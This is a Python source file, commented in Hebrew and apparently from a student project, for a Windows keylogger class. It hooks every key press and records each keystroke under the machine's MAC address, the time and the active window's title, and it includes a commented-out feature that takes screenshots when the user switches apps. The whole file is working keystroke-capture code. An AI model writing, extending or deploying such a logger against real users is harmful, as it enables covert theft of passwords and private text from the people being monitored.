import keyboard  # ספרייה לזיהוי והאזנה ללחיצות מקשים
import os  # ספרייה לפעולות מערכת
import time  # ספרייה לעבודה עם זמן
from PIL import ImageGrab  # לכידת מסך (מושבת כרגע)
from getmac import get_mac_address  # קבלת כתובת MAC של המחשב
import win32gui  # עבודה עם ממשק GUI של Windows

class KeyloggerService:
    def __init__(self):
        """
        אתחול הקי-לוגר:
        - __action: משתנה בוליאני לקביעת מצב ההקלטה (מופעל/כבוי)
        - __data: מילון לאחסון הנתונים שנאספים
        - prev_up: משתנה למעקב אחר האפליקציה הפעילה הקודמת
        - current_app: משתנה לשמירת שם האפליקציה הפעילה הנוכחית
        """
        self.__action = False
        self.__data = {}
        self.prev_up = None
        self.current_app = None

    def __change_action(self):
        """החלפת מצב הפעולה של הקי-לוגר (הפעלת/כיבוי)."""
        self.__action = not self.__action

    def return_action(self):
        """החזרת מצב הפעולה הנוכחי (True = פועל, False = כבוי)."""
        return self.__action

    def __exit_point(self):
        """
        בודק אם המשתמש לחץ על 'Shift+Q'.
        אם כן - מפסיק את פעולת הקי-לוגר.
        """
        if keyboard.is_pressed('shift+q'):
            self.__change_action()

    @staticmethod
    def __current_time() -> str:
        """מחזיר את הזמן הנוכחי בפורמט יום/חודש/שנה שעה:דקה."""
        return time.strftime('%d/%m/%Y  %H:%M')

    def __on_press(self, pressed_key):
        """פונקציה שמתבצעת בכל לחיצה על מקש במקלדת."""
        key = pressed_key.name  # מקבל את שם המקש שנלחץ
        self.__add_to_data(self.__data, key)  # מוסיף למבנה הנתונים
        self.__exit_point()  # בודק אם המשתמש לחץ על צירוף הכיבוי

    def __add_on_release(self, pressed_key):
        """פונקציה שמתבצעת כאשר מקש משתחרר (כעת אינה עושה כלום משמעותי)."""
        return pressed_key.name

    # def current_screenshot(self):
    #     """
    #     קטע קוד (מושבת) שאמור לצלם את המסך בעת מעבר בין אפליקציות.
    #     ##### הבעיה: הקוד מושבת ואינו בשימוש כרגע.
    #     """
    #     if [self.prev_up] != [self.current_app]:
    #         screen_shot = ImageGrab.grab()
    #         path = rf"C:\Users\1\projet keylogger kodkode\picture-{time.strftime('%d-%m-%Y  %H-%M-%S')}.jpg"
    #         screen_shot.save(path)
    #         self.prev_up = self.current_app

    def __add_to_data(self, dictionary: dict, data: str):
        """
        פונקציה שמוסיפה מידע למבנה הנתונים של הקי-לוגר:
        - מזהה את המכשיר לפי כתובת MAC
        - שומר את הזמן שבו נלחץ המקש
        - משייך את ההקשה לאפליקציה הפעילה באותו רגע
        """
        current_time = self.__current_time()
        current_mac_address = get_mac_address()
        current_app_1 = win32gui.GetForegroundWindow()
        current_app = win32gui.GetWindowText(current_app_1)
        self.current_app = rf"{current_app}"

        if not dictionary.get(current_mac_address):
            dictionary[current_mac_address] = {}
        if not dictionary[current_mac_address].get(current_time):
            dictionary[current_mac_address][current_time] = {}
        if not dictionary[current_mac_address][current_time].get(self.current_app):
            dictionary[current_mac_address][current_time][self.current_app] = []
        dictionary[current_mac_address][current_time][self.current_app].append(data)

    def start(self):
        """
        הפעלת הקי-לוגר והאזנה ללחיצות מקשים.
        """
        self.__change_action()
        keyboard.on_press(self.__on_press)  # רישום מאזין להקשות מקשים
        keyboard.on_release(self.__add_on_release)  # מאזין לשחרור מקשים
        time.sleep(0.1)

    def get_data(self):
        """
        מחזיר את הנתונים שנאספו עד כה ואז מאפס את הזיכרון.
        """
        data = self.__data
        self.__data = {}  # מאפס את הנתונים
        return data

    # def __enter__(self):
    #     """
    #     פונקציה שהייתה מאפשרת שימוש עם "with", אך כרגע היא מושבתת.
    #     """
    #     self.start()

    # def __exit__(self, exc_type, exc_val, exc_tb):
    #     """
    #     פונקציה שמשמשת לניקוי לאחר יציאה מ-"with".
    #     ##### הבעיה: לא מבצעת שום ניקוי משמעותי.
    #     """
    #     return 1
